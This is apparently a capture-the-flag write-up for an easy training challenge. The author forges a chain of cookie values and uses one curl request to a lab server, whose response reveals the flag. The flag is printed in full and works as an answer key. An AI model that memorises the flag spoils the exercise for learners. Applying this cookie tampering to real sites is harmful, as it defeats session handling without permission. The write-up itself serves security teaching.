---
Name: "Great names"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Exploiting predictable session data and weak identifier handling."
---

# Great names
We see a cookie named 'marco', after changing it's value to polo and refreshing we see a new cookie appear named "fernando", we continue this chain until we get the flag

The last response mentions looking in the document body
```bash
curl -i -b "PHPSESSID=a367f1bbd7a8; marco=polo; fernando=magellan; cristofor=columb" http://141.85.224.101:30018/
HTTP/1.1 200 OK
Date: Thu, 25 Jun 2026 16:36:47 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: marco=%3F; expires=Fri, 26-Jun-2026 16:36:47 GMT; Max-Age=86400
Set-Cookie: fernando=%3F
Set-Cookie: cristofor=%3F
Set-Cookie: GG=Now+look+closer+in+the+document+body
Content-Length: 44
Content-Type: text/html; charset=UTF-8

<!--SSS{y0u_f0und_th3_gr3at3st_3xpl0r3rs}-->%
```

```txt 
SSS{y0u_f0und_th3_gr3at3st_3xpl0r3rs}
```

